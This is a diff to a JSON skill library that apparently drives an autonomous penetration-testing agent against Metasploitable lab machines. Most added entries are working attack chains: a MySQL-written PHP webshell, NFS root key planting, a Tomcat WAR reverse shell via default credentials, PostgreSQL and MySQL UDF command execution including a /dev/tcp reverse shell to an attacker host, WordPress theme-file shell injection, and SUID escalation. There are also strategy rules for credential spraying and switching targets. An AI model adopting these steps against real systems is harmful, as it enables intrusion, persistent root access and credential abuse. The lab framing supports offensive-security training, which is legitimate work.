@@ -1,7 +1,7 @@
 {
   "version": "1.0",
-  "last_updated": 1770654394.1387498,
-  "skill_count": 52,
+  "last_updated": 1770665768.6017728,
+  "skill_count": 66,
   "skills": {
     "skill_001": {
       "id": "skill_001",
@@ -749,6 +749,188 @@
         "ms2_anti_forensics_knowledge"
       ],
       "created_at": 1770654394.0932927,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms2_hard_mysql_webshell": {
+      "id": "ms2_hard_mysql_webshell",
+      "if_condition": "HARD difficulty AND Port 3306 open AND MySQL no-password",
+      "then_action": "mysql -h {target} -u root \u2192 SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/shell.php' \u2192 curl http://{target}/shell.php?c=id. WHY: When backdoors are blocked, MySQL's INTO OUTFILE writes a webshell to Apache's docroot. No exploit module needed \u2014 just SQL.",
+      "parameters_template": {},
+      "confidence": 0.91,
+      "evidence_refs": [
+        "ms2_hard_chain"
+      ],
+      "created_at": 1770665768.567,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms2_hard_nfs_chain": {
+      "id": "ms2_hard_nfs_chain",
+      "if_condition": "HARD difficulty AND Port 2049 open (NFS)",
+      "then_action": "showmount -e {target} \u2192 mount -t nfs {target}:/ /mnt \u2192 ssh-keygen \u2192 write pubkey to /mnt/root/.ssh/authorized_keys \u2192 ssh root@{target}. WHY: NFS with no_root_squash lets us write as root remotely. This 4-step chain gives persistent root access without any exploit.",
+      "parameters_template": {},
+      "confidence": 0.92,
+      "evidence_refs": [
+        "ms2_kill_chain_nfs_to_root"
+      ],
+      "created_at": 1770665768.567001,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms2_hard_tomcat_war": {
+      "id": "ms2_hard_tomcat_war",
+      "if_condition": "HARD difficulty AND Port 8180 open AND Tomcat",
+      "then_action": "msfvenom -p java/jsp_shell_reverse_tcp \u2192 curl --upload-file shell.war http://tomcat:tomcat@{target}:8180/manager/deploy \u2192 trigger. WHY: Tomcat default creds (tomcat:tomcat) allow WAR deployment. This is a CREDENTIAL-based exploit \u2014 not blocked by hard mode.",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "ms2_credentials"
+      ],
+      "created_at": 1770665768.5670023,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms2_hard_postgres_rce": {
+      "id": "ms2_hard_postgres_rce",
+      "if_condition": "HARD difficulty AND Port 5432 open AND PostgreSQL",
+      "then_action": "psql -h {target} -U postgres \u2192 CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;. WHY: PostgreSQL COPY FROM PROGRAM executes OS commands. Default creds (postgres:postgres) + SQL RCE = shell without exploit modules.",
+      "parameters_template": {},
+      "confidence": 0.89,
+      "evidence_refs": [
+        "ms2_credentials"
+      ],
+      "created_at": 1770665768.5670033,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms2_hard_web_dvwa_chain": {
+      "id": "ms2_hard_web_dvwa_chain",
+      "if_condition": "HARD difficulty AND Port 80 open AND DVWA detected",
+      "then_action": "dirb http://{target} \u2192 login DVWA (admin:password) \u2192 SQL injection in vuln pages \u2192 extract /etc/passwd via UNION SELECT LOAD_FILE \u2192 crack hashes \u2192 SSH. WHY: Multi-step web chain using DVWA's intentional vulns. Teaches enumeration\u2192exploitation\u2192post-exploitation arc.",
+      "parameters_template": {},
+      "confidence": 0.86,
+      "evidence_refs": [
+        "ms2_services"
+      ],
+      "created_at": 1770665768.5670042,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms2_hard_distcc_privesc": {
+      "id": "ms2_hard_distcc_privesc",
+      "if_condition": "HARD difficulty AND Port 3632 open AND distccd",
+      "then_action": "exploit/unix/misc/distcc_exec \u2192 daemon user shell \u2192 find / -perm -4000 \u2192 nmap --interactive \u2192 !sh for root. WHY: distccd gives low-priv shell (daemon). Old nmap with SUID has --interactive mode \u2192 shell escape to root. Two-step chain.",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "CVE-2004-2687"
+      ],
+      "created_at": 1770665768.567005,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms2_hard_php_cgi_chain": {
+      "id": "ms2_hard_php_cgi_chain",
+      "if_condition": "HARD difficulty AND Port 80 open AND PHP-CGI detected",
+      "then_action": "nikto -h {target} \u2192 discover /cgi-bin/ \u2192 exploit/multi/http/php_cgi_arg_injection \u2192 www-data shell \u2192 kernel privesc. WHY: PHP-CGI argument injection (CVE-2012-1823) gives www-data shell. Then enumerate kernel version for privilege escalation.",
+      "parameters_template": {},
+      "confidence": 0.83,
+      "evidence_refs": [
+        "CVE-2012-1823"
+      ],
+      "created_at": 1770665768.5670059,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "strategy_difficulty_adaptation": {
+      "id": "strategy_difficulty_adaptation",
+      "if_condition": "Easy paths are blocked (medium/hard difficulty)",
+      "then_action": "STOP trying backdoors. Enumerate: MySQL(3306), PostgreSQL(5432), NFS(2049), Tomcat(8180), DVWA(80), distccd(3632). These are the MULTI-STEP vectors. WHY: Hard mode specifically blocks single-step root paths. The agent must pivot to credential-based and web-based chains.",
+      "parameters_template": {},
+      "confidence": 0.94,
+      "evidence_refs": [
+        "difficulty_presets"
+      ],
+      "created_at": 1770665768.567007,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "strategy_parallel_vectors": {
+      "id": "strategy_parallel_vectors",
+      "if_condition": "Single exploit path is failing or stuck",
+      "then_action": "Maintain 3+ parallel attack vectors simultaneously. If MySQL fails, try NFS. If NFS fails, try web. WHY: Real penetration tests never rely on a single vector \u2014 redundancy is key.",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "ms2_kill_chain_multi_vector"
+      ],
+      "created_at": 1770665768.567008,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "strategy_credential_spray": {
+      "id": "strategy_credential_spray",
+      "if_condition": "Credentials found AND multiple services open",
+      "then_action": "Test found credentials against ALL open services (SSH, Telnet, MySQL, FTP). WHY: Credential reuse is the #1 post-exploitation technique. Users reuse passwords across services 70%+ of the time.",
+      "parameters_template": {},
+      "confidence": 0.91,
+      "evidence_refs": [
+        "lateral_movement_patterns"
+      ],
+      "created_at": 1770665768.5673885,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "strategy_exploit_ordering": {
+      "id": "strategy_exploit_ordering",
+      "if_condition": "Multiple vulnerabilities discovered",
+      "then_action": "Priority: backdoors(instant) \u2192 default creds(fast) \u2192 known CVE exploits(reliable) \u2192 web vulns(complex) \u2192 brute force(slow). WHY: Efficiency matters. The fastest path to root uses the least steps and has the highest probability of success.",
+      "parameters_template": {},
+      "confidence": 0.93,
+      "evidence_refs": [
+        "phase_reasoning"
+      ],
+      "created_at": 1770665768.567393,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms3_mysql_udf_chain": {
+      "id": "ms3_mysql_udf_chain",
+      "if_condition": "MS3 target AND Port 3306 open AND MySQL",
+      "then_action": "mysql -h {target} -u root -p'sploitme' \u2192 CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; \u2192 SELECT sys_exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'). WHY: UDF (User-Defined Functions) allow executing system commands from MySQL. MS3's weak password 'sploitme' gives initial access.",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "ms3_credentials"
+      ],
+      "created_at": 1770665768.5673945,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "ms3_wordpress_to_shell_chain": {
+      "id": "ms3_wordpress_to_shell_chain",
+      "if_condition": "MS3 target AND Port 80 open AND WordPress detected",
+      "then_action": "wpscan --enumerate ap \u2192 find vulnerable plugin \u2192 exploit OR login admin:admin \u2192 Appearance \u2192 Theme Editor \u2192 inject PHP reverse shell into 404.php. WHY: WordPress admin can edit theme files, injecting PHP code that executes on page load.",
+      "parameters_template": {},
+      "confidence": 0.86,
+      "evidence_refs": [
+        "ms3_kill_chain_wordpress"
+      ],
+      "created_at": 1770665768.567396,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "strategy_target_switching": {
+      "id": "strategy_target_switching",
+      "if_condition": "Current target fully compromised to CLOSEOUT",
+      "then_action": "Switch targets: if on MS2 \u2192 consider MS3. Carry over learned strategies, adjust for new service landscape. WHY: Cross-target transfer learning is the hallmark of a skilled pentester \u2014 patterns transfer but details differ.",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "multi_target_strategy"
+      ],
+      "created_at": 1770665768.5673969,
       "usage_count": 0,
       "success_rate": 0.0
     }
